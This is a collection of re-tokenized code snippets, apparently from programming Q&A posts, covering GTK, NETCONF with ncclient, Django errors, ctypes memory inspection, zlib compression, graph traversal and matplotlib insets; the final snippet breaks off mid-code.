expand_tree_view_button = gtk.ToolButton ( icon_name= '' list-add '' ) expand_tree_view_button.connect ( `` clicked '' , lambda e : self._tree_view.expand_all ( ) ) collapse_tree_view_button = gtk.ToolButton ( icon_name= '' list-remove '' ) collapse_tree_view_button.connect ( `` clicked '' , lambda e : self._tree_view.collapse_all ( ) ) toolbar.insert ( expand_tree_view_button , -1 ) toolbar.insert ( collapse_tree_view_button , -1 ) status_bar = gtk.Statusbar ( ) status_bar.push ( status_bar.get_context_id ( `` Status message '' ) , `` A status message . '' ) self._master_grid = gtk.Grid ( ) self._master_grid.attach ( toolbar , 0 , 0 , 1 , 1 ) self._master_grid.attach ( scrolled_tree_view , 0 , 1 , 1 , 1 ) self._master_grid.attach ( status_bar , 0 , 2 , 1 , 1 ) self.add ( self._master_grid ) self.connect ( `` delete-event '' , gtk.main_quit ) self.show_all ( ) def populate_tree_view ( self ) : tree_store = gtk.TreeStore ( str , str , str ) # Warnings do n't occur when there are less than 100 `` root '' items for i in range ( 100 ) : item1 = tree_store.append ( None , [ `` Window `` + str ( i + 1 ) , `` 12345678 '' , `` ClassName '' ] ) for j in range ( 3 ) : item2 = tree_store.append ( item1 , [ `` Window `` + str ( i + 1 ) + str ( i + 2 ) , `` 12345678 '' , `` ClassName '' ] ) for k in range ( 5 ) : tree_store.append ( item2 , [ `` Window `` + str ( i + 1 ) + str ( j + 1 ) + str ( k + 1 ) , `` 12345678 '' , `` ClassName '' ] ) self._tree_view.set_model ( tree_store ) class MCVEApp ( gtk.Application ) : def __init__ ( self , *args , **kwargs ) : super ( ) .__init__ ( *args , **kwargs ) def do_activate ( self ) : MCVEWindow ( ) gtk.main ( ) if __name__ == `` __main__ '' : MCVEApp ( ) .run ( )"
"# ! /usr/bin/env python # hack on XML element creation and create a subclass to override HelloHandler 's # build ( ) method to format the XML in a way that the brocades actually likefrom ncclient.xml_ import *from ncclient.transport.session import HelloHandlerfrom ncclient.operations.rpc import RPC , RaiseModefrom ncclient.operations import util # register brocade namespace and create functions to create proper xml for # hello/capabilities exchangeBROCADE_1_0 = `` http : //brocade.com/ns/netconf/config/netiron-config/ '' register_namespace ( 'brcd ' , BROCADE_1_0 ) brocade_new_ele = lambda tag , ns , attrs= { } , **extra : ET.Element ( qualify ( tag , ns ) , attrs , **extra ) brocade_sub_ele = lambda parent , tag , ns , attrs= { } , **extra : ET.SubElement ( parent , qualify ( tag , ns ) , attrs , **extra ) # subclass RPC to override self._id to change uuid-generated message-id 's ; # Brocades seem to not be able to handle the really long id'sclass BrcdRPC ( RPC ) : def __init__ ( self , session , async=False , timeout=30 , raise_mode=RaiseMode.NONE ) : self._id = `` 1 '' return super ( BrcdRPC , self ) .self._idclass BrcdHelloHandler ( HelloHandler ) : def __init__ ( self ) : return super ( BrcdHelloHandler , self ) .__init__ ( ) @ staticmethod def build ( capabilities ) : hello = brocade_new_ele ( `` hello '' , None , { 'xmlns ' : '' urn : ietf : params : xml : ns : netconf : base:1.0 '' } ) caps = brocade_sub_ele ( hello , `` capabilities '' , None ) def fun ( uri ) : brocade_sub_ele ( caps , `` capability '' , None ) .text = uri map ( fun , capabilities ) return to_xml ( hello ) # return super ( BrcdHelloHandler , self ) .build ( ) ? ? ? # since there 's no classes I 'm assuming I can just override the function itself # in ncclient.operations.util ? def build_filter ( spec , capcheck=None ) : type = None if isinstance ( spec , tuple ) : type , criteria = spec # brocades want the netconf prefix on subtree filter attribute rep = new_ele ( `` filter '' , { 'nc : type ' : type } ) if type == `` xpath '' : rep.attrib [ `` select '' ] = criteria elif type == `` subtree '' : rep.append ( to_ele ( criteria ) ) else : raise OperationError ( `` Invalid filter type '' ) else : rep = validated_element ( spec , ( `` filter '' , qualify ( `` filter '' ) ) , attrs= ( `` type '' , ) ) # TODO set type var here , check if select attr present in case of xpath.. if type == `` xpath '' and capcheck is not None : capcheck ( `` : xpath '' ) return rep # ! /usr/bin/env pythonfrom ncclient import managerfrom brcd_ncclient import *manager.logging.basicConfig ( filename='ncclient.log ' , level=manager.logging.DEBUG ) # brocade server capabilities advertising as 1.1 compliant when they 're really not # this will stop ncclient from attempting 1.1 chunked netconf message transactionsmanager.CAPABILITIES = [ 'urn : ietf : params : netconf : capability : writeable-running:1.0 ' , 'urn : ietf : params : netconf : base:1.0 ' ] # BROCADE_1_0 is the namespace defined for netiron configs in brcd_ncclient # this maps to the 'brcd ' prefix used in xml elements , ie subtree filter criteriawith manager.connect ( host='hostname_or_ip ' , username='username ' , password='password ' ) as m : # 'get ' request with no filter - for brocades just shows 'show version ' data c = m.get ( ) print c # 'get-config ' request with 'mpls-config ' filter - if no filter is # supplied with 'get-config ' , brocade returns nothing netironcfg = brocade_new_ele ( 'netiron-config ' , BROCADE_1_0 ) mplsconfig = brocade_sub_ele ( netironcfg , 'mpls-config ' , BROCADE_1_0 ) filterstr = to_xml ( netironcfg ) c2 = m.get_config ( source='running ' , filter= ( 'subtree ' , filterstr ) ) print c2 # so far it only looks like the supported filters for 'get-config ' # operations are : 'interface-config ' , 'vlan-config ' and 'mpls-config ' < ? xml version= ' 1.0 ' encoding='UTF-8 ' ? > < nc : hello xmlns : nc= '' urn : ietf : params : xml : ns : netconf : base:1.0 '' > < nc : capabilities > < nc : capability > urn : ietf : params : netconf : base:1.0 < /nc : capability > < nc : capability > urn : ietf : params : netconf : capability : writeable-running:1.0 < /nc : capability > < /nc : capabilities > < /nc : hello > < ? xml version= '' 1.0 '' encoding= '' UTF-8 '' ? > < hello xmlns= '' urn : ietf : params : xml : ns : netconf : base:1.0 '' > < capabilities > < capability > urn : ietf : params : netconf : base:1.0 < /capability > < capability > urn : ietf : params : netconf : capability : writeable-running:1.0 < /capability > < /capabilities > < /hello >"
"> > > if a = b : File `` < stdin > '' , line 1 if a = b : ^SyntaxError : invalid syntax > > > if a == b : ... pass ... > > > a = ( b = 2 ) File `` < stdin > '' , line 1 a = ( b = 2 ) ^SyntaxError : invalid syntax > > > a = b = c = 2 > > > a , b , c ( 2 , 2 , 2 )"
"some_function ( filename = `` foobar.c '' , **kwargs , )"
"abcdefghijklmnopqrstuvwxyz badcfehgjilknmporqtsvuxwzy s = str ( range ( ord ( ' a ' ) , ord ( ' z ' ) + 1 ) ) new_s = `` for i in xrange ( len ( s ) ) : if i ! = 0 and i % 2 == 0 : new_s += ' _ ' + s [ i ] else : new_s += s [ i ] # Now it should result in a string such as 'ab_cd_ef_ ... wx_yz ' l = new_s.split ( ' _ ' ) for i in xrange ( len ( l ) ) : l [ i ] = l [ i ] [ : :-1 ] result = str ( l )"
"//fixed parametersk = 2m = 256*8//the filterbyte [ m/8 ] bloom # # What is this part ? function insertIP ( byte [ ] ip ) { byte [ 20 ] hash = sha1 ( ip ) int index1 = hash [ 0 ] | hash [ 1 ] < < 8 int index2 = hash [ 2 ] | hash [ 3 ] < < 8 // truncate index to m ( 11 bits required ) index1 % = m # # ? index2 % = m # # ? // set bits at index1 and index2 bloom [ index1 / 8 ] |= 0x01 < < index1 % 8 # # ? ? bloom [ index2 / 8 ] |= 0x01 < < index2 % 8 # # ? ? } // insert IP 192.168.1.1 into the filter : insertIP ( byte [ 4 ] { 192,168,1,1 } ) import hashlibm = 2048def hashes ( s ) : index = [ 0 , 0 ] # for c in s : # o = ord ( c ) index [ 0 ] = hashlib.sha224 ( index [ 0 ] ) .hexdigest # # This needs integer hash index [ 1 ] = hashlib.sha224 ( index [ 1 ] ) .hexdigest # # same as above return [ x % m for x in index ] class BloomFilter ( object ) : def __init__ ( self ) : self.bitarray = [ 0 ] * m def add ( self , s ) : for x in hashes ( s ) : self.bitarray [ x ] = 1 # print self.bitarray def query ( self , s ) : return all ( self.bitarray [ x ] == 1 for x in hashes ( s ) ) shazib=BloomFilter ( ) shazib.add ( '192.168.0.1 ' ) print shazib.query ( '192.168.0.1 ' )"
"bash-3.2 $ echo foo foo # no echo.bash-3.2 $ catfoo # I typed this.foo # cat returned it ; no additional echo.bash-3.2 $ pythonPython 2.7.5 ( default , May 19 2013 , 13:26:46 ) [ GCC 4.2.1 Compatible Apple Clang 4.1 ( ( tags/Apple/clang-421.11.66 ) ) ] on darwinType `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > # C-d has no effect . C-q C-d has no effect . # not sure where this blank link has come from. > > > quit ( ) # I have to type this to get out of Pythonquit ( ) # note that it is echoed , like anything I now type.bash-3.2 $ echo fooecho foo # now I am getting my input echoed.foobash-3.2 $ catcat # echo of the 'cat ' command.foo # my inputfoo # echo of my input.foo # cat 's output.bash-3.2 $ stty -echo # turn echo back off.stty -echobash-3.2 $ echo foofoo # and it 's off.bash-3.2 $"
"def main ( global_config , **settings ) : `` '' '' This function returns a WSGI application. `` '' '' engine = engine_from_config ( settings , 'sqlalchemy . ' ) initialize_sql ( engine ) # -- and so on -- - def initialize_sql ( engine ) : DBSession.configure ( bind=engine ) Base.metadata.bind = engine Base.metadata.create_all ( engine ) try : session = DBSession ( ) page = Page ( 'FrontPage ' , 'initial data ' ) session.add ( page ) transaction.commit ( ) except IntegrityError : # already created pass"
"> > > from ctypes import string_at > > > from sys import getsizeof > > > from binascii import hexlify > > > a = b '' Hello , World ! `` ; addr = id ( a ) ; size = getsizeof ( a ) > > > print ( string_at ( addr , size ) ) b'\x01\x00\x00\x00\xd4j\xb2x\r\x00\x00\x00 < J\xf6\x0eHello , World ! \x00 ' > > > del a > > > print ( string_at ( addr , size ) ) b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00 ' > > > a = b'Superkaliphragilisticexpialidocious ' ; addr = id ( a ) ; size = getsizeof ( a ) > > > print ( string_at ( addr , size ) ) b'\x01\x00\x00\x00\xd4j\xb2x # \x00\x00\x00\x9cb ; \xc2Superkaliphragilisticexpialidocious\x00 ' > > > del s > > > print ( string_at ( addr , size ) ) b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 ) ) \n\x00\x00ous\x00 ' from collections import defaultdictfrom ctypes import string_atimport gcimport osfrom sys import getsizeofdef get_random_bytes ( length=16 ) : return os.urandom ( length ) def test_different_bytes_lengths ( ) : rc = defaultdict ( list ) for ii in range ( 1 , 101 ) : while True : value = get_random_bytes ( ii ) if b'\x00 ' not in value : break check = [ b for b in value ] addr = id ( value ) size = getsizeof ( value ) del value gc.collect ( ) garbage = string_at ( addr , size ) [ 16 : -1 ] for jj in range ( ii , 0 , -1 ) : if garbage.endswith ( bytes ( bytearray ( check [ -jj : ] ) ) ) : # for bytes of length ii , tail of length jj found rc [ jj ] .append ( ii ) break return { k : len ( v ) for k , v in rc.items ( ) } , dict ( rc ) # The runs all look something like this ( there is some variation ) : # ( { 1 : 2 , 2 : 2 , 3 : 81 } , { 1 : [ 1 , 13 ] , 2 : [ 2 , 14 ] , 3 : [ 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 , 15 , 16 , 17 , 18 , 19 , 20 , 21 , 22 , 23 , 24 , 25 , 26 , 27 , 28 , 29 , 30 , 31 , 32 , 33 , 34 , 35 , 36 , 37 , 38 , 39 , 40 , 41 , 42 , 43 , 44 , 45 , 46 , 47 , 48 , 49 , 50 , 51 , 52 , 53 , 54 , 55 , 56 , 57 , 58 , 59 , 60 , 61 , 62 , 63 , 64 , 65 , 66 , 67 , 68 , 69 , 70 , 71 , 72 , 73 , 74 , 75 , 83 , 91 , 92 , 93 , 94 , 95 , 96 , 97 , 98 , 99 , 100 ] } ) # That is : # - One byte left over twice ( always when the original bytes object was of lengths 1 or 13 , the first is likely because of the internal 'characters ' list kept by Python ) # - Two bytes left over twice ( always when the original bytes object was of lengths 2 or 14 ) # - Three bytes left over in most other cases ( the exact ones varies between runs but never has '12 ' in it ) # For added fun , if I replace the get_random_bytes call with one that returns an encoded string or random alphanumerics then results change slightly : lengths of 13 and 14 are now fully cleared too . My original test string was 13 bytes of encoded alphanumerics , of course ! > > > def hello_forever ( ) : ... a = b '' Hello , World ! `` ; addr = id ( a ) ; size = getsizeof ( a ) ... print ( string_at ( addr , size ) ) ... del a ... print ( string_at ( addr , size ) ) ... gc.collect ( ) ... print ( string_at ( addr , size ) ) ... return addr , size ... > > > addr , size = hello_forever ( ) b'\x02\x00\x00\x00\xd4J0x\r\x00\x00\x00 < J\xf6\x0eHello , World ! \x00 ' b'\x01\x00\x00\x00\xd4J0x\r\x00\x00\x00 < J\xf6\x0eHello , World ! \x00 ' b'\x01\x00\x00\x00\xd4J0x\r\x00\x00\x00 < J\xf6\x0eHello , World ! \x00 ' > > > print ( string_at ( addr , size ) ) b'\x01\x00\x00\x00\xd4J0x\r\x00\x00\x00 < J\xf6\x0eHello , World ! \x00 '"
"from django.core.management.base import BaseCommandclass Command ( BaseCommand ) : def handle ( self , *args , **options ) : print ( 'hello ' , end= '' , file=self.stdout ) print ( 'world ' , file=self.stdout ) hello world hello world self.stdout.ending = ``"
"class WordItem : def __init__ ( self , phrase : str , word_type : WORD_TYPE ) : self.id = f ' { phrase } _ { word_type.name.lower ( ) } ' self.phrase = phrase self.word_type = word_type @ classmethod def from_payload ( cls , payload : Dict [ str , Any ] ) - > 'WordItem ' : return cls ( **payload )"
"W = matrix ( [ [ 0 , 1 , 0 , 1 , 0 , 0 , 0 , 0 , 0 ] , [ 1 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 0 ] , [ 0 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 0 ] , [ 1 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 0 ] , [ 0 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 0 ] , [ 0 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 1 ] , [ 0 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 0 ] , [ 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 1 ] , [ 0 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 ] ] ) row_sums = W.sum ( 1 ) W2 = matrix ( [ [ 0. , 0.5 , 0. , 0.5 , 0. , 0. , 0. , 0. , 0 . ] , [ 0.33 , 0. , 0.33 , 0. , 0.33 , 0. , 0. , 0. , 0 . ] , [ 0. , 0.5 , 0. , 0. , 0. , 0.5 , 0. , 0. , 0 . ] , [ 0.33 , 0. , 0. , 0. , 0.33 , 0. , 0.33 , 0. , 0 . ] , [ 0. , 0.25 , 0. , 0.25 , 0. , 0.25 , 0. , 0.25 , 0 . ] , [ 0. , 0. , 0.33 , 0. , 0.33 , 0. , 0. , 0. , 0.33 ] , [ 0. , 0. , 0. , 0.5 , 0. , 0. , 0. , 0.5 , 0 . ] , [ 0. , 0. , 0. , 0. , 0.33 , 0. , 0.33 , 0. , 0.33 ] , [ 0. , 0. , 0. , 0. , 0. , 0.5 , 0. , 0.5 , 0 . ] ] ) for i in range ( 9 ) : W2 [ i ] = W [ i ] /row_sums [ i ]"
running_sum = my_array.cumsum ( ) greater_than_threshold = running_sum > thresholdindex = greater_than_threshold.searchsorted ( True )
"class Meta ( type ) : def __new__ ( cls , name , bases , attrs , **kwargs ) : attrs [ ' x ' ] = 0 return super ( ) .__new__ ( cls , name , bases , attrs ) @ property def x ( cls ) : return cls.__dict__ [ ' x ' ] class Class ( metaclass=Meta ) : def __init__ ( self ) : self.id = __class__.x __class__.__dict__ [ ' x ' ] += 1"
"class Person ( object ) : def drive ( self , f , t ) : raise NotImplementedErrorclass John ( Person ) : def drive ( self , f , t ) : print `` John drove from % s to % s '' % ( f , t ) class Kyle ( Person ) : def drive ( self , f , t ) : print `` Kyle drove from % s to % s '' % ( f , t ) class RandomPerson ( Person ) : # instansiate either John or Kyle , and inherit it . passclass Vehicle ( object ) : passclass Driver ( Person , Vehicle ) : def __init__ ( self ) : # instantiate and inherit a RandomPerson somehow passd1 = Driver ( ) d1.drive ( 'New York ' , 'Boston ' ) > > > `` John drove from New York to Boston '' d2 = Driver ( ) d2.drive ( 'New Jersey ' , 'Boston ' ) > > > `` Kyle drove from New Jersey to Boston ''"
"def get_context_data ( self , **kwargs ) : # Call the base implementation first to get a context context = super ( IndexView , self ) .get_context_data ( **kwargs ) `` '' '' Return the last five published posts . '' '' '' context [ 'latest_post_list ' ] = Post.objects.order_by ( '-pub_date ' ) [ :5 ] context [ 'archives ' ] = Post.objects.datetimes ( 'pub_date ' , 'month ' , order='DESC ' ) return context ; { % for archive in archives % } < li > < a href= '' # '' > { { archive.month } } { { archive.year } } < /a > < /li > { % endfor % } TIME_ZONE = 'America/Montreal ' Environment : Request Method : GETRequest URL : http : //localhost:8000/blog/Django Version : 1.6.1Python Version : 3.3.3Installed Applications : ( 'django_admin_bootstrapped.bootstrap3 ' , 'django_admin_bootstrapped ' , 'django.contrib.admin ' , 'django.contrib.auth ' , 'django.contrib.contenttypes ' , 'django.contrib.sessions ' , 'django.contrib.messages ' , 'django.contrib.staticfiles ' , 'localflavor ' , 'reversion ' , 'autoslug ' , 'blog ' , 'acpkinballmanageleague ' , 'acpkinballmanageteams ' , 'acpkinballmanageevents ' , 'acpkinballmanagemembers ' ) Installed Middleware : ( 'django.contrib.sessions.middleware.SessionMiddleware ' , 'django.middleware.common.CommonMiddleware ' , 'django.middleware.csrf.CsrfViewMiddleware ' , 'django.contrib.auth.middleware.AuthenticationMiddleware ' , 'django.contrib.messages.middleware.MessageMiddleware ' , 'django.middleware.clickjacking.XFrameOptionsMiddleware ' ) Template error : In template C : \Users\Ara\Documents\Sites\kinball\blog\templates\posts\index.html , error at line 55 time zone `` Eastern Standard Time '' not recognized 45 : < nav class= '' tags '' > 46 : 47 : < /nav > 48 : < /div > 49 : 50 : < ! -- Archives -- > 51 : < nav class= '' widget '' > 52 : < h4 > Archives < /h4 > 53 : { % if latest_post_list % } 54 : < ul class= '' categories '' > 55 : { % for archive in archives % } 56 : < li > < a href= '' # '' > { { archive.month } } { { archive.year } } < /a > < /li > 57 : { % endfor % } 58 : < /ul > 59 : { % endif % } 60 : < /nav > 61 : 62 : < ! -- Tweets -- > 63 : < div class= '' widget '' > 64 : < h4 > Twitter < /h4 > 65 : < ul id= '' twitter-blog '' > < /ul > Traceback : File `` C : \Python33\lib\site-packages\django\core\handlers\base.py '' in get_response 139. response = response.render ( ) File `` C : \Python33\lib\site-packages\django\template\response.py '' in render 105. self.content = self.rendered_contentFile `` C : \Python33\lib\site-packages\django\template\response.py '' in rendered_content 82. content = template.render ( context ) File `` C : \Python33\lib\site-packages\django\template\base.py '' in render 140. return self._render ( context ) File `` C : \Python33\lib\site-packages\django\template\base.py '' in _render 134. return self.nodelist.render ( context ) File `` C : \Python33\lib\site-packages\django\template\base.py '' in render 840. bit = self.render_node ( node , context ) File `` C : \Python33\lib\site-packages\django\template\debug.py '' in render_node 78. return node.render ( context ) File `` C : \Python33\lib\site-packages\django\template\loader_tags.py '' in render 123. return compiled_parent._render ( context ) File `` C : \Python33\lib\site-packages\django\template\base.py '' in _render 134. return self.nodelist.render ( context ) File `` C : \Python33\lib\site-packages\django\template\base.py '' in render 840. bit = self.render_node ( node , context ) File `` C : \Python33\lib\site-packages\django\template\debug.py '' in render_node 78. return node.render ( context ) File `` C : \Python33\lib\site-packages\django\template\loader_tags.py '' in render 62. result = block.nodelist.render ( context ) File `` C : \Python33\lib\site-packages\django\template\base.py '' in render 840. bit = self.render_node ( node , context ) File `` C : \Python33\lib\site-packages\django\template\debug.py '' in render_node 78. return node.render ( context ) File `` C : \Python33\lib\site-packages\django\template\defaulttags.py '' in render 305. return nodelist.render ( context ) File `` C : \Python33\lib\site-packages\django\template\base.py '' in render 840. bit = self.render_node ( node , context ) File `` C : \Python33\lib\site-packages\django\template\debug.py '' in render_node 78. return node.render ( context ) File `` C : \Python33\lib\site-packages\django\template\defaulttags.py '' in render 156. len_values = len ( values ) File `` C : \Python33\lib\site-packages\django\db\models\query.py '' in __len__ 77. self._fetch_all ( ) File `` C : \Python33\lib\site-packages\django\db\models\query.py '' in _fetch_all 854. self._result_cache = list ( self.iterator ( ) ) File `` C : \Python33\lib\site-packages\django\db\models\sql\compiler.py '' in results_iter 1096. for rows in self.execute_sql ( MULTI ) : File `` C : \Python33\lib\site-packages\django\db\models\sql\compiler.py '' in execute_sql 781. cursor.execute ( sql , params ) File `` C : \Python33\lib\site-packages\django\db\backends\util.py '' in execute 69. return super ( CursorDebugWrapper , self ) .execute ( sql , params ) File `` C : \Python33\lib\site-packages\django\db\backends\util.py '' in execute 53. return self.cursor.execute ( sql , params ) File `` C : \Python33\lib\site-packages\django\db\utils.py '' in __exit__ 99. six.reraise ( dj_exc_type , dj_exc_value , traceback ) File `` C : \Python33\lib\site-packages\django\utils\six.py '' in reraise 490. raise value.with_traceback ( tb ) File `` C : \Python33\lib\site-packages\django\db\backends\util.py '' in execute 53. return self.cursor.execute ( sql , params ) Exception Type : DataError at /blog/Exception Value : time zone `` Eastern Standard Time '' not recognized"
"package mainimport ( `` compress/flate '' `` bytes '' `` fmt '' ) func compress ( source string ) [ ] byte { w , _ : = flate.NewWriter ( nil , 7 ) buf : = new ( bytes.Buffer ) w.Reset ( buf ) w.Write ( [ ] byte ( source ) ) w.Close ( ) return buf.Bytes ( ) } func main ( ) { example : = `` foo '' compressed : = compress ( example ) fmt.Println ( compressed ) } from __future__ import print_functionimport zlibdef compress ( source ) : # golang zlib strips header + checksum compressor = zlib.compressobj ( 7 , zlib.DEFLATED , -15 ) compressor.compress ( source ) # python zlib defaults to Z_FLUSH , but # https : //golang.org/pkg/compress/flate/ # Writer.Flush # says `` Flush is equivalent to Z_SYNC_FLUSH '' return compressor.flush ( zlib.Z_SYNC_FLUSH ) def main ( ) : example = u '' foo '' compressed = compress ( example ) print ( list ( bytearray ( compressed ) ) ) if __name__ == `` __main__ '' : main ( ) $ go versiongo version go1.7.3 darwin/amd64 $ go build compress.go $ ./compress [ 74 203 207 7 4 0 0 255 255 ] $ python -- version $ python 2.7.12 $ python compress.py [ 74 , 203 , 207 , 7 , 0 , 0 , 0 , 255 , 255 ]"
"import sysfrom guppy import hpyclass Graph : def __init__ ( self , key ) : self.key = key # unique id for a vertex self.connections = [ ] self.visited = False def count_bfs ( start ) : parents = [ start ] children = [ ] count = 0 while parents : for ind in parents : if not ind.visited : count += 1 ind.visited = True for child in ind.connections : children.append ( child ) parents = children children = [ ] return countdef count_dfs ( start ) : if not start.visited : start.visited = True else : return 0 n = 1 for connection in start.connections : n += count_dfs ( connection ) return ndef construct ( file , s=1 ) : `` '' '' Constructs a Graph using the adjacency matrix given in the file : param file : path to the file with the matrix : param s : starting node key . Defaults to 1 : return start vertex of the graph `` '' '' d = { } f = open ( file , 'rU ' ) size = int ( f.readline ( ) ) for x in xrange ( 1 , size+1 ) : d [ x ] = Graph ( x ) start = d [ s ] for i in xrange ( 0 , size ) : l = map ( lambda x : int ( x ) , f.readline ( ) .split ( ) ) node = l [ 0 ] for child in l [ 1 : ] : d [ node ] .connections.append ( d [ child ] ) return startif __name__ == `` __main__ '' : s = construct ( sys.argv [ 1 ] ) # h = hpy ( ) print ( count_bfs ( s ) ) # print h.heap ( ) s = construct ( sys.argv [ 1 ] ) # h = hpy ( ) print ( count_dfs ( s ) ) # print h.heap ( ) 41 2 32 1 33 4 4"
"import pandas as pdimport numpy as nptest = pd.Series ( data = [ NaN , 2 , u'string ' ] ) np.isnan ( test ) .sum ( ) # Error # Work aroundtest2 = [ x for x in test if not ( isinstance ( x , unicode ) ) ] numNaNs = np.isnan ( test2 ) .sum ( )"
' % .6f ' % 0.1 > ' 0.100000 '' % .6f ' % .12345678901234567890 > ' 0.123457 ' str ( 0.1 ) > ' 0.1'str ( .12345678901234567890 ) > ' 0.123456789012 '
"Traceback ( most recent call last ) : File `` /Users/g72/miniconda3/bin/ipython '' , line 11 , in < module > sys.exit ( start_ipython ( ) ) File `` /Users/g72/miniconda3/lib/python3.7/site-packages/IPython/__init__.py '' , line 125 , in start_ipython return launch_new_instance ( argv=argv , **kwargs ) File `` /Users/g72/miniconda3/lib/python3.7/site-packages/traitlets/config/application.py '' , line 663 , in launch_instance app.initialize ( argv ) File `` < /Users/g72/miniconda3/lib/python3.7/site-packages/decorator.py : decorator-gen-113 > '' , line 2 , in initialize File `` /Users/g72/miniconda3/lib/python3.7/site-packages/traitlets/config/application.py '' , line 87 , in catch_config_error return method ( app , *args , **kwargs ) File `` /Users/g72/miniconda3/lib/python3.7/site-packages/IPython/terminal/ipapp.py '' , line 317 , in initialize self.init_shell ( ) File `` /Users/g72/miniconda3/lib/python3.7/site-packages/IPython/terminal/ipapp.py '' , line 333 , in init_shell ipython_dir=self.ipython_dir , user_ns=self.user_ns ) File `` /Users/g72/miniconda3/lib/python3.7/site-packages/traitlets/config/configurable.py '' , line 412 , in instance inst = cls ( *args , **kwargs ) File `` /Users/g72/miniconda3/lib/python3.7/site-packages/IPython/terminal/interactiveshell.py '' , line 464 , in __init__ self.init_prompt_toolkit_cli ( ) File `` /Users/g72/miniconda3/lib/python3.7/site-packages/IPython/terminal/interactiveshell.py '' , line 296 , in init_prompt_toolkit_cli **self._extra_prompt_options ( ) ) TypeError : __init__ ( ) got an unexpected keyword argument 'inputhook'If you suspect this is an IPython bug , please report it at : https : //github.com/ipython/ipython/issuesor send an email to the mailing list at ipython-dev @ python.orgYou can print a more detailed traceback right now with `` % tb '' , or use `` % debug '' to interactively debug it.Extra-detailed tracebacks for bug-reporting purposes can be enabled via : c.Application.verbose_crash=True"
"[ [ a , abc ] , [ b , def ] , [ c , ghi ] , [ d , abc ] , [ a , ghi ] , [ e , fg ] , [ f , f76 ] , [ b , f76 ] ] 1,0,0,1,0,00,1,0,0,0,01,0,1,0,0,00,0,0,0,1,00,1,0,0,0,1"
"app = webapp2.WSGIApplication ( [ ( '/ ' , MainPage ) , ( '/sign ' , Guestbook ) ] , debug=True )"
"import unittestclass MyProcessor ( ) : `` '' '' This is the class under test `` '' '' def __init__ ( self ) : pass def ProcessData ( self , content ) : return [ 'some ' , 'processed ' , 'data ' , 'from ' , 'content ' ] # Imagine this could actually passclass Test_test2 ( unittest.TestCase ) : def LoadContentFromTestFile ( self ) : return None # Imagine this is actually doing something that could pass . def setUp ( self ) : self.content = self.LoadContentFromTestFile ( ) self.assertIsNotNone ( self.content , `` Failed to load test data '' ) self.processor = MyProcessor ( ) def test_ProcessData ( self ) : results = self.processor.ProcessData ( self.content ) self.assertGreater ( results , 0 , `` No results returned '' ) if __name__ == '__main__ ' : unittest.main ( ) F======================================================================FAIL : test_ProcessData ( __main__.Test_test2 ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Traceback ( most recent call last ) : File `` C : \Projects\Experiments\test2.py '' , line 21 , in setUp self.assertIsNotNone ( self.content , `` Failed to load test data '' ) AssertionError : unexpectedly None : Failed to load test data -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Ran 1 test in 0.000sFAILED ( failures=1 )"
"import mathfrom matplotlib import pyplot , rcParamsrcParams [ 'xtick.direction ' ] = 'out'rcParams [ 'ytick.direction ' ] = 'out'INSET_DEFAULT_WIDTH = 0.35INSET_DEFAULT_HEIGHT = 0.25INSET_PADDING = 0.05INSET_TICK_FONTSIZE = 8def axis_data_transform ( axis , xin , yin , inverse=False ) : `` '' '' Translate between axis and data coordinates . If 'inverse ' is True , data coordinates are translated to axis coordinates , otherwise the transformation is reversed . Code by Covich , from : https : //stackoverflow.com/questions/29107800/ `` '' '' xlim , ylim = axis.get_xlim ( ) , axis.get_ylim ( ) xdelta , ydelta = xlim [ 1 ] - xlim [ 0 ] , ylim [ 1 ] - ylim [ 0 ] if not inverse : xout , yout = xlim [ 0 ] + xin * xdelta , ylim [ 0 ] + yin * ydelta else : xdelta2 , ydelta2 = xin - xlim [ 0 ] , yin - ylim [ 0 ] xout , yout = xdelta2 / xdelta , ydelta2 / ydelta return xout , youtdef add_inset_to_axis ( fig , axis , rect ) : left , bottom , width , height = rect def transform ( coord ) : return fig.transFigure.inverted ( ) .transform ( axis.transAxes.transform ( coord ) ) fig_left , fig_bottom = transform ( ( left , bottom ) ) fig_width , fig_height = transform ( [ width , height ] ) - transform ( [ 0 , 0 ] ) return fig.add_axes ( [ fig_left , fig_bottom , fig_width , fig_height ] ) def collide_rect ( ( left , bottom , width , height ) , fig , axis , data ) : # Find the values on the x-axis of left and right edges of the rect . x_left_float , _ = axis_data_transform ( axis , left , 0 , inverse=False ) x_right_float , _ = axis_data_transform ( axis , left + width , 0 , inverse=False ) x_left = int ( math.floor ( x_left_float ) ) x_right = int ( math.ceil ( x_right_float ) ) # Find the highest and lowest y-value in that segment of data . minimum_y = min ( data [ int ( x_left ) : int ( x_right ) ] ) maximum_y = max ( data [ int ( x_left ) : int ( x_right ) ] ) # Convert the bottom and top of the rect to data coordinates . _ , inset_top = axis_data_transform ( axis , 0 , bottom + height , inverse=False ) _ , inset_bottom = axis_data_transform ( axis , 0 , bottom , inverse=False ) # Detect collision . if ( ( bottom > 0.5 and maximum_y > inset_bottom ) or # inset at top of chart ( bottom < 0.5 and minimum_y < inset_top ) ) : # inset at bottom return True return Falseif __name__ == '__main__ ' : x_data , y_data = range ( 0 , 100 ) , [ -1.0 ] * 50 + [ 1.0 ] * 50 # Square wave . y_min , y_max = min ( y_data ) , max ( y_data ) fig = pyplot.figure ( ) axis = fig.add_subplot ( 111 ) axis.set_ylim ( y_min - 0.1 , y_max + 